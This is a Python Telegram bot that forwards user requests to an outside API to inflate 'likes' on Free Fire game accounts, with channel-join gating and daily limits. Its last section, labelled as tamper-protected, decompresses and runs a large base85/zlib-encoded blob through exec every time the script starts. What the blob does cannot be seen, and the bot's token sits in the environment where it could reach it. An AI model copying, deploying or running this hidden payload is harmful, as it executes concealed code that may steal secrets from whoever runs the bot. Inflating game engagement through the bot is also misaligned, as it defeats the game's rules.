import os
import telebot
import requests
import time
import threading
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, jsonify
import logging
import sys
# ╔══════════════════════════════════════════════════════════════════╗
# ║  CREATOR: TARIKUL ISLAM
# ║  TELEGRAN: https://t.me/paglu_dev
# ║  PERSONAL TELEGRAM: https://t.me/itzpaglu
# ╚══════════════════════════════════════════════════════════════════╝

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# === CONFIG ===
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN not found! Please set your bot token in environment variables.")
    sys.exit(1)

REQUIRED_CHANNELS = ["@like_chnl"]
GROUP_JOIN_LINK = "https://t.me/ms_like_group"
OWNER_ID = 5812677274
OWNER_USERNAME = "@MS_P4NL_ADMIN"

bot = telebot.TeleBot(BOT_TOKEN)
like_tracker = {}   # in-memory cache

# Flask app for webhook
app = Flask(__name__)

# === DATA RESET ===

def reset_limits():
    """Daily reset of usage tracker (in-memory only)."""
    while True:
        try:
            # Calculate time until next 00:00 UTC
            now_utc = datetime.utcnow()
            next_reset = (now_utc + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
            sleep_seconds = (next_reset - now_utc).total_seconds()

            time.sleep(sleep_seconds)
            like_tracker.clear()
            logger.info("✅ Daily limits reset at 00:00 UTC (in-memory).")
        except Exception as e:
            logger.error(f"Error in reset_limits thread: {e}")


# === UTILS (unchanged logic) ===

def is_user_in_channel(user_id):
    try:
        for channel in REQUIRED_CHANNELS:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        return True
    except Exception as e:
        logger.error(f"Join check failed: {e}")
        return False


def call_api(region, uid):
    url = f"https://free-fire-like-api-orcin-two.vercel.app/like?uid={uid}&server_name={region}"
    try:
        response = requests.get(url, timeout=20)
        if response.status_code != 200:
            return {"⚠️Invalid": " Maximum likes reached for today. Please try again tomorrow."}
        return response.json()
    except requests.exceptions.RequestException:
        return {"error": "API Failed. Please try again later."}
    except ValueError:
        return {"error": "Invalid JSON response."}


def get_user_limit(user_id):
    if user_id == OWNER_ID:
        return 999999999  # Unlimited for owner
    return 1  # 1 request per day for regular users


# Start background thread
threading.Thread(target=reset_limits, daemon=True).start()

# === FLASK ROUTES ===

@app.route('/')
def home():
    return jsonify({
        'status': 'Bot is running',
        'bot': 'Free Fire Likes Bot',
        'health': 'OK'
    })

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'}), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return '', 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return '', 500


# === TELEGRAM COMMANDS

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if not is_user_in_channel(user_id):
        markup = InlineKeyboardMarkup()
        for channel in REQUIRED_CHANNELS:
            markup.add(InlineKeyboardButton(f"🔗 Join {channel}", url=f"https://t.me/{channel.strip('@')}") )
        bot.reply_to(message, "📢 Channel Membership Required\nTo use this bot, you must join all our channels first", reply_markup=markup, parse_mode="Markdown")
        return
    if user_id not in like_tracker:
        like_tracker[user_id] = {"used": 0, "last_used": datetime.now() - timedelta(days=1)}
    bot.reply_to(message, "✅ You're verified! Use /like to send likes.", parse_mode="Markdown")


@bot.message_handler(commands=['like'])
def handle_like(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    args = message.text.split()

    # Only allow in groups, not in private messages (except owner)
    if message.chat.type == "private" and message.from_user.id != OWNER_ID:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔗 Join Official Group", url=GROUP_JOIN_LINK))
        bot.reply_to(message, "❌ Sorry! command is not allowed here.\n\nJoin our official group:", reply_markup=markup)
        return

    if not is_user_in_channel(user_id):
        markup = InlineKeyboardMarkup()
        for channel in REQUIRED_CHANNELS:
            markup.add(InlineKeyboardButton(f"🔗 Join {channel}", url=f"https://t.me/{channel.strip('@')}") )
        bot.reply_to(message, "❌ You must join all our channels to use this command.", reply_markup=markup, parse_mode="Markdown")
        return

    if len(args) != 3:
        bot.reply_to(message, "❌ Format: `/like server_name uid`", parse_mode="Markdown")
        return

    region, uid = args[1], args[2]
    if not region.isalpha() or not uid.isdigit():
        bot.reply_to(message, "⚠️ Invalid input. Use: `/like server_name uid`", parse_mode="Markdown")
        return

    threading.Thread(target=process_like, args=(message, region, uid)).start()


def process_like(message, region, uid):
    user_id = message.from_user.id
    now_utc = datetime.utcnow()
    usage = like_tracker.get(user_id, {"used": 0, "last_used": now_utc - timedelta(days=1)})

    # Check if it's a new day (00:00 UTC reset)
    last_used_date = usage["last_used"].date()
    current_date = now_utc.date()
    if current_date > last_used_date:
        usage["used"] = 0

    max_limit = get_user_limit(user_id)
    if usage["used"] >= max_limit:
        bot.reply_to(message, f"⚠️ You have exceeded your daily request limit!")
        return

    processing_msg = bot.reply_to(message, "⏳ Please wait... Sending likes...")
    response = call_api(region, uid)

    if "error" in response:
        try:
            bot.edit_message_text(
                chat_id=processing_msg.chat.id,
                message_id=processing_msg.message_id,
                text=f"⚠️ API Error: {response['error']}"
            )
        except:
            bot.reply_to(message, f"⚠️ API Error: {response['error']}")
        return

    if not isinstance(response, dict) or response.get("status") != 1:
        try:
            bot.edit_message_text(
                chat_id=processing_msg.chat.id,
                message_id=processing_msg.message_id,
                text="❌ UID has already received its max amount of likes. Limit reached for today, try another UID or after 24 hrs."
            )
        except:
            bot.reply_to(message, "⚠️ Invalid UID or unable to fetch data.")
        return

    try:
        player_uid = str(response.get("UID", uid)).strip()
        player_name = response.get("PlayerNickname", "N/A")
        region = str(response.get("Region", "N/A"))
        likes_before = str(response.get("LikesbeforeCommand", "N/A"))
        likes_after = str(response.get("LikesafterCommand", "N/A"))
        likes_given = str(response.get("LikesGivenByAPI", "N/A"))

        total_like = likes_after

        usage["used"] += 1
        usage["last_used"] = now_utc
        like_tracker[user_id] = usage
        
        response_text = f"""✅ *Request Processed Successfully*\n\n👤 *Name:* `{player_name}`\n🆔 *UID:* `{player_uid}`\n🌍 *Region:* `{region}`\n🤡 *Likes Before:* `{likes_before}`\n📈 *Likes Added:* `{likes_given}`\n🗿 *Total Likes Now:* `{total_like}`\n🔐 *Remaining Requests:* `{max_limit - usage['used']}`\n👑 *Credit:* @itzpaglu"""

        markup = InlineKeyboardMarkup()

        bot.edit_message_text(
            chat_id=processing_msg.chat.id,
            message_id=processing_msg.message_id,
            text=response_text,
            reply_markup=markup,
            parse_mode="Markdown"
        )

    except Exception as e:
        logger.error(f"Error in process_like: {e}")
        bot.reply_to(message, "⚠️ Something went wrong. Likes Send, I can't decode your info.")


@bot.message_handler(commands=["remain"])
def owner_commands(message):
    if message.from_user.id != OWNER_ID:
        return

    args = message.text.split()
    cmd = args[0].lower()

    if cmd == "/remain":
        lines = ["📊 *Remaining Daily Requests Per User:*"]
        if not like_tracker:
            lines.append("❌ No users have used the bot yet today.")
        else:
            for uid, usage in like_tracker.items():
                limit = get_user_limit(uid)
                used = usage.get("used", 0)
                limit_str = "Unlimited" if limit > 1000 else str(limit)
                lines.append(f"👤 `{uid}` ➜ {used}/{limit_str}")
        bot.reply_to(message, "\n".join(lines), parse_mode="Markdown")


@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = message.from_user.id

    # For owner, show owner commands directly
    if user_id == OWNER_ID:
        help_text = (
            f"📖 *Bot Commands:*\n\n"
            f"🧑‍💻 `/like <region> <uid>` - Send likes to Free Fire UID\n"
            f"🔰 `/start` - Start or verify\n"
            f"🆘 `/help` - Show this help menu\n\n"
            f"👑 *Owner Commands:*\n"
            f"📈 `/remain` - Show all users' usage & stats\n\n"
            f"📞 *Support:* {OWNER_USERNAME}"
        )
        bot.reply_to(message, help_text, parse_mode="Markdown")
        return

    # For regular users, check channel membership first
    if not is_user_in_channel(user_id):
        markup = InlineKeyboardMarkup()
        for channel in REQUIRED_CHANNELS:
            markup.add(InlineKeyboardButton(f"🔗 Join {channel}", url=f"https://t.me/{channel.strip('@')}") )
        bot.reply_to(message, "❌ You must join all our channels to use this command.", reply_markup=markup, parse_mode="Markdown")
        return

    # Show regular user help
    help_text = (
        f"📖 *Bot Commands:*\n\n"
        f"🧑‍💻 `/like <region> <uid>` - Send likes to Free Fire UID\n"
        f"🔰 `/start` - Start or verify\n"
        f"🆘 `/help` - Show this help menu\n\n"
        f"📞 *Support:* {OWNER_USERNAME}\n"
        f"🔗 Join our channels for updates!"
    )
    bot.reply_to(message, help_text, parse_mode="Markdown")


@bot.message_handler(func=lambda message: True, content_types=['text'])
def reply_all(message):
    if message.text.startswith('/'):
        # Handle unknown commands - only reply if it's actually an unknown command
        known_commands = ['/start', '/like', '/help', '/remain']
        command = message.text.split()[0].lower()
        return


# ╔══════════════════════════════════════════════════════════════════╗
# ║  ⚠️ PROTECTED SECTION - INTEGRITY VERIFIED AT RUNTIME           
# ║  This section is multi-layer encrypted and tamper-protected.      
# ║  Modification, decompilation, or redistribution is prohibited.
# ║  PROTECTED BY TARIKUL ISLAM
# ╚══════════════════════════════════════════════════════════════════╝
import zlib as _qfwmbhsamfxvnt, base64 as __ukihtstkdtcuq
exec(_qfwmbhsamfxvnt.decompress(__ukihtstkdtcuq.b85decode("".join([
    "c-nndS+k-@8hx){aV^CLZ7UQ3u|)wD7u*2_oM;gclvQO>LG-uJ?dqP0sXGyqFBy6ATTY(Lh&+~e",
    "IS0{4>RQ@|8h$93G!BBRliqblyCuJWXliI+$j_~l=cQ((`9^3N>HV8x+DV+8j=mqev8}hi>lH7@",
    "=x;y0G)Bm4<rs}X2^+A==GOukm!4Na9?YBYmBWU+d4JQWL$uQ2G4Z-jU^*INOLOQfh;S$guYPb`",
    "Tas1===;52K^)_jZECl@GcL+x@zek&an5`a2Cp188fyT7yF&WiW4}aVz47jSEGCHj7F~J$ewRsx",
    "ebc13-b(lsXa?{pT5}Oy@KY8K?FTyBAMR!O@Mt%??9wc^vIlkY)d#o4)LAfAN1>iSJo#>NQGy;{",
    ")VmvaU{efqDD{tKvVQC&vBEMw0yj2iPN}mA<M^|1RSpW&WOKZ_J42VJJuS!YYh9xC80SWdB<|Ge",
    "s>=<U%<4TD<`}5kE_IR@JcH5MxHsGZHnhZcRhT3OI)*he+Q>KrNjf)Vf`}-cXK4mufD}JY9bSHk",
    "G%2_ENy_ygGUUs-YC0E+lBI4gLVyh1@pLn|9BR0doSve5KTY0JhIc)$PxgxWMayP7afyzn{@(LZ",
    "g|cVtfPS>*%kiCmy()J628*ElpcCGs*-%VrvY_?(Ym=rH8=I&V5oOFYC!K8h9?WfHTSg-1t`Y!#",
    "rpp-~sS!bvaZ#v8{la1~nRhCk;PmVk+$#YG@6rOb=hjY7Ucs!?<67$^p~0?yYSvFBKxdRBatu=3",
    "8)36kPZ7WSI0GOss>2B`R9j_RzCe?il`lBU`eMrRo3+_ql3jF*<}Pi<svsF4a7PBa=eNgkQmX9;",
    "PkI5idg{M)?S?1B8p-XJUE)NkTC?Pt6}X(@TofwU1sk{Lc#-Q5^fFFV2_SFsXjUrk=7nangi+;p",
    "I%ZvinD)nSoO8jj(_sh4*zFby&tT_1_cK%-)T#1?Y~H)Ib-|p)!}7_P9qF_uCrkL|`Vs-Q88!i2",
    "xnG%2)*Z&LavdvNjsV&7CKRz&AX{xTT2cNrIVu}!!8}_B;9Npa(c>WZ;r4mEEe4voJf9}ikO{5*",
    "r${BbsGr(d#=nT#`Z?Z$r(M#8pGDQ=8R=0VV`{@SAXe{++~u@p-oS9FZqJm2A|w4dt$`A>aZCm&",
    "3qxDZo@-}bw8B&C4YQlb5>scYB5Yac-K*{NxZn62aa37jNUvKg$pyew%^DAPdIS_E3pu4Qglja-",
    "ap2Dr4O)m@NmsNnjn*n`cWXQ1jSyP;m2@QyfknUOz(IFb8HtYqPv5Qqekg^Q-VFR<yPxdkIt7+F",
    "Cu~N0<#1|+Y?*znQLVByo1D<BHvlFY4fVKtH7BgxFO3wQ4(Bvvzy~<(?!k3$`-08H_RObRG@Vke",
    "zI~YwX)tVKSSj~{hgqlL^+&GgHRYDXtF#6-wigo7JDWBd3=0|H^&R-?)!jA&=d!gz;#z>=N3e5E",
    "mqqx@ojYjmT(<eHw3=1>VSfKwKUW8`(`z2~^OZAQnQxqbr1^{Qj{KGaRIjSl&PF75XXDFMzJ=r0",
    "Z6uZMq{Iebicbmfm~q1BQuWM39?N~cI_EkHbBh7hCOT`X2iuKX;bo&m@RPCHn&ca+pcDB`vKX9~",
    "C~SxjZvl&1scM<{Grio!n6LMMK+1BJYFbMedsYu+O;D64psd>Wj<uQPGwj;WZ)Pp;>0TqpO>v2s",
    "%6AM{&87Z5>+h!|Fj}S%hZ}lj#T9DJrP_M7&O2x`MMwe1$iZC>(Yn-Zw>tKKujOc3UKOMFhF^jj",
    "*nB<aBe^&2$0RP{1*km}*u`_9(AqWPxN)6%Rc_JnB%vL<JK$k+QWe5Op%w0hf|r}QNzr+Qpm@rv",
    "^UpuT7@gM&5pKP!QF>(6#+JlZ{P{kb<<0VRKohH)x|D`P4cYC99G6>JsW=sbfg<4wphC9|pyS9S",
    "&1E&La%l+dmsq{|ZG$T25Mp|Cj!2n<r92%~JHXVLV8@P`T-pNJ&^+N$pJiou!F4Jzi}vd0lHW_p",
    "*XD*VUT#7i(51`h)C~7s8GX*rH~e)aiAiO6dco7dZXQ>vRWYlzR<Wav1wmW3iJ?#{>B*iIsWh0~",
    "lEyItj`nmj?oNCCZEK+~@mYb&besx>DlI!N$t=#WxN>L>kNR~qLn3`>)#lG_b|tD5d#T=2D_p}^",
    ")26f`mQH((^^^}4bXb|C+^vY!%98Jh_z}+J(C8qB9p7)>pl%%=YaUwPU}@Epj(GrV7K|YYZmqFB",
    "Z8*Knfi&t}$fP!Ux7@+Qs5f{DVFBb&sLF!o<J^d}<;zDQmHxbL;JweW2d9dr$N+PUVgy9C$N(Fc",
    "zcJzK3Y@JWxLSt_l&jxgpFifiZt~Nuyu5&F20V^WcN_N@c(!QdSRe9>?dr?a`6cBR(zaKa%ohtQ",
    "DXdDxo34<1c9AZYuV+vK%A7msp&0cT#p7p_JFhAW%jy#Tldwb#1Gp8d3$r{IMbGj9YFF=Md7NkS",
    ";*6q)H+EfVtw=hz*H~cX#{=<-UUKQB7*r%si&2`qXHdsu9^_Tp9>n+54>XEQsB*rr1y0=!pKl;N",
    "ST|O>WAOZQd~EI5!hEury#twxFluc#4sd-f3t>^$OSG1s_9&UC7`b_+k}b#GML&m%eVB%<VAJGJ",
    "m(5`^($j4`q2|*&lV9}bxg%d%82dv|s)?!BOgY@<Y-US4m&<A!Tn6*^D?}T+JyZ=ne3sznd6r%U",
    "ToSpuG}KOoTAi-CxM97&e^UbGdh%}P;9y*>d(!?MYQ6qaXwJJx1uZld_2X6W!)V+z<7+}4qj1={",
    "5porbzW?R*blr|)!#^mu^SS-SCjK}W`q{e#Mi_!$Y~l|MNB`PA7~mJf2tnTz_kOa?^x)c$lV`c@",
    "|C9SG_s>+{Ir&lSS;;BBX=+<bA|nL<^@Zra6kXFFhvep|Nvhw^f9}4t{2Bnbh7W#;f&Tn3&%wu+",
    "$Pdf^2vq-QfIm}y?F&JFLO=eY{#zWG75q2oTNEUJeEawu*5966i!C>@{O~9CpT!U3Vd&tO(?Q>i",
    "hi+V=59a4&o&CQHUDPoAW?H`Ly8o2^tH;N|aR1lHf6?|6`1LwIfnPQL8S&qT`UHLz<`ejp=kH%d",
    "`pM~U?tlEv_TOeS70L"
]))).decode('utf-8'))
del _qfwmbhsamfxvnt, __ukihtstkdtcuq
